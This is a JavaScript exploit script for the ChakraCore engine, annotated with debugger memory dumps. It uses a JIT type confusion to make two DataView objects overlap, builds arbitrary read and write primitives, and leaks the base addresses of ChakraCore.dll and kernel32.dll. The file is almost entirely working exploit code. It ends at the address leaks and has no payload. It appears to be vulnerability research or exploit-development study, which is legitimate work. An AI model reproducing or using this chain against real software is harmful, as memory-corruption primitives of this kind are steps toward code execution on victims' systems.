// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
// C:\Users\kali\Desktop\ChakraCore\ChakraCore\Build\VcBuild\bin\exploit-1.js
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

dataview1.setUint32(0x0, 0x43434343, true); 
dataview1.setUint32(0x4, 0x43434343, true); 
dataview1.setUint32(0x8, 0x43434343, true); 
dataview1.setUint32(0xc, 0x43434343, true); 
dataview1.setUint32(0x10, 0x43434343, true); 
dataview1.setUint32(0x14, 0x43434343, true); 
dataview1.setUint32(0x18, 0x43434343, true); 
dataview1.setUint32(0x1c, 0x43434343, true); 
dataview1.setUint32(0x20, 0x43434343, true); 
dataview1.setUint32(0x24, 0x43434343, true); 
dataview1.setUint32(0x28, 0x43434343, true); 
dataview1.setUint32(0x2c, 0x43434343, true); 
dataview1.setUint32(0x30, 0x43434343, true); 
dataview1.setUint32(0x34, 0x43434343, true); 
dataview1.setUint32(0x38, 0x43434343, true); 
dataview1.setUint32(0x3c, 0x43434343, true); 
dataview1.setUint32(0x40, 0x43434343, true); 
dataview1.setUint32(0x44, 0x43434343, true); 
dataview1.setUint32(0x48, 0x43434343, true); 
dataview1.setUint32(0x4c, 0x43434343, true); 

dataview2.setUint32(0x0, 0x44444444, true); 
dataview2.setUint32(0x4, 0x44444444, true); 
dataview2.setUint32(0x8, 0x44444444, true); 
dataview2.setUint32(0xc, 0x44444444, true); 

function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function testWrites64() {
	dataview1.setUint32(0x0, 0x42424242, true); 	
	dataview1.setUint32(0x4, 0x42424242, true);    
	print("DEBUG - testWrites64");
	/*
0:004> dqs 00000186`1c70e000
00000186`1c70e000  00007ffa`0cd91e30 chakracore!Js::DataView::`vftable' (dataview1)
00000186`1c70e008  00000186`1c6e2040
00000186`1c70e010  00000000`00000000
00000186`1c70e018  00000000`00000000
00000186`1c70e020  00000000`00000100
00000186`1c70e028  00000186`1c6f00a0
00000186`1c70e030  00000000`00000000
00000186`1c70e038  00000186`1c70e040
00000186`1c70e040  42424242`42424242 (dataview2)
00000186`1c70e048  00000186`1c6e2040
00000186`1c70e050  00000000`00000000
00000186`1c70e058  00000000`00000000
00000186`1c70e060  00000000`00000100
00000186`1c70e068  00000186`1c6f00f0
00000186`1c70e070  00000000`00000000
00000186`1c70e078  00000186`1ad6d470 <- dataview1.setUint32 will write the address here
                                     <- dataview2.setUint32 will write to whereever the address is pointing to
0:004> dqs 00000186`1ad6d470
00000186`1ad6d470  44444444`44444444
00000186`1ad6d478  44444444`44444444

dataview1->buffer: 00000186`1c70e040
dataview1.setUint32(0x0, 0xXXXXXXXX, true) will set whatever 00000186`1c70e040 is pointing to (which should be the vftable)
dataview1.setUint32(0x8, 0xXXXXXXXX, true) will set whatever 00000186`1c70e040+8 is pointing to (which should be the type)
	*/
}

function hex(x) {
    x = x.toString(16);
    while (x.length < 8) x = "0"+x
    return x
}

function write64(addressLower64Bit, addressHigher64Bit, valueLower64Bit, valueHigher64Bit) {
	// 0x38/0x8 = 0x7
	// dataview1.setUint32(0x38...) is basically obj.h
	dataview1.setUint32(0x38, addressLower64Bit, true); 	// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
	dataview2.setUint32(0x0, valueLower64Bit, true);		// 4-byte arbitrary write
	dataview2.setUint32(0x4, valueHigher64Bit, true);		// 4-byte arbitrary write
}

function read64(addressLower64Bit, addressHigher64Bit) {
	// 0x38/0x8 = 0x7
	// dataview1.setUint32(0x38...) is basically obj.h
	dataview1.setUint32(0x38, addressLower64Bit, true); 	// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
	
	var read = new Uint32Array(0x10);
	read[0] = dataview2.getUint32(0x0, true);
	read[1] = dataview2.getUint32(0x4, true);
	return read
}

function main() {

    vtableLo = dataview1.getUint32(0, true);
	vtableHigh = dataview1.getUint32(4, true);
	print("[+] DataView object 1 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    vtableLo = dataview2.getUint32(0, true);
	vtableHigh = dataview2.getUint32(4, true);
	print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));


    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    print("DEBUG - hehe opt() is not marked as 'HOT'"); // ch!WScriptJsrt::EchoCallback
    let o = {a: 0x41414141, b: 0x42424242};             // chakracore!Js::DynamicTypeHandler::SetSlotUnchecked
                                                        // should hit twice   
    print("DEBUG - type confusion incoming...");        // ch!WScriptJsrt::EchoCallback
                                                        // ba w 8 first inline value
    opt(o, o, obj);		  
    print("DEBUG - o.a = obj (obj->vftable)!");         // ch!WScriptJsrt::EchoCallback
                                                        // first inline value should be a pointer to another vftable
    // O-ADDRESS:       o->vftable
    // O-TYPE:          o->type
    // O-INLINE-1:      obj->vftable (o.a)
    // o.a:             obj->vftable 
    // o.b:             obj->type
    // o.c:             obj->auxSlots[0]
    // o.d:             obj->auxSlots[0]+8
    // obj.a:           1
    // obj->auxSlots[0]:1 
    // obj.b:           2
    // obj->auxSlots[1]:2 
    // ...
    // all the above are "pointer to"s
    o.c = dataview1 
    //o.d = 0x42424242 // observe the impact here, will crash program though
    print("DEBUG - set obj->auxSlots to dataview");       // ch!WScriptJsrt::EchoCallback
    // o.c:               dataview1->vftable
    // obj->auxSlots[0]:  dataview1->vftable
    // obj->auxSlots[7]:  dataview1->buffer
    // obj.h:             dataview1->buffer
    // o.d:               obj->auxSlots[0]+8
    // obj->auxSlots[0]+8:0x42424242
    obj.h = dataview2 // value here corrupted and will be leaked via dataview1
    /*
00000139`e3921e40  00007ffa`0cd91e30 chakracore!Js::DataView::`vftable'
00000139`e3921e48  00000139`e3912040
00000139`e3921e50  00000000`00000000
00000139`e3921e58  00000000`00000000
00000139`e3921e60  00000000`00000100
00000139`e3921e68  00000139`e39200a0
00000139`e3921e70  00000000`00000000
00000139`e3921e78  00000131`e1f0ca50
...
0:004> dqs 00000131`e1f0ca50
00000131`e1f0ca50  43434343`43434343
00000131`e1f0ca58  43434343`43434343
///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////
00000268`8544b600  00007ffa`0cc888b0 chakracore!Js::DynamicObject::`vftable'
00000268`8544b608  00000268`8544d580
00000268`8544b610  00000268`85295320 o.a = obj
...
00000268`85295320  00007ffa`0cc888b0 chakracore!Js::DynamicObject::`vftable'
00000268`85295328  00000268`85291e00
00000268`85295330  00000268`85291e40 o.c = dataview1
...
00000268`85291e40  00007ffa`0cd91e30 chakracore!Js::DataView::`vftable'
00000268`85291e48  00000268`85282040
00000268`85291e50  00000000`00000000
00000268`85291e58  00000000`00000000
00000268`85291e60  00000000`00000100
00000268`85291e68  00000268`852900a0
00000268`85291e70  00000000`00000000
00000268`85291e78  00000268`85291e80 obj.h = dataview2
...
00000268`85291e80  00007ffa`0cd91e30 chakracore!Js::DataView::`vftable'
00000268`85291e88  00000268`85282040
00000268`85291e90  00000000`00000000
00000268`85291e98  00000000`00000000
00000268`85291ea0  00000000`00000100
00000268`85291ea8  00000268`852900f0
00000268`85291eb0  00000000`00000000
00000268`85291eb8  00000260`8389c670
...
0:004> dqs 00000260`8389c670
00000260`8389c670  44444444`44444444
00000260`8389c678  44444444`44444444
00000260`8389c680  00000000`00000000
00000260`8389c688  00000000`00000000
00000260`8389c690  00000000`00000000
    */
    // o.c:               dataview1->vftable
    // obj->auxSlots[0]:  dataview1->vftable
    // obj->auxSlots[7]:  dataview2->vftable
    // obj.h:             dataview2->vftable
    // o.d:               obj->auxSlots[0]+8
    // obj->auxSlots[0]+8:0x42424242
    //
    print("DEBUG - hehe let's make some arbitrary reads and writes"); 

    //testWrites64()

    vtableLo = dataview1.getUint32(0, true);
	vtableHigh = dataview1.getUint32(4, true);
	print("[+] DataView object 1 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    vtableLo = dataview2.getUint32(0, true);
	vtableHigh = dataview2.getUint32(4, true);
	print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    chakraLo = dataview1.getUint32(0, true) - 0x1961298 - 0xb98;
    chakraHigh = dataview1.getUint32(4, true);
    print("[+] ChakraCore.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));

    KERNEL32_RaiseException = read64(chakraLo+0x17c0000+0x40, chakraHigh)
    kernel32High = KERNEL32_RaiseException[1]
    kernel32Lo   = KERNEL32_RaiseException[0]-0x00024d70
    print("[+] kernel32.dll base address: 0x" + hex(kernel32High) + hex(kernel32Lo));

}

main();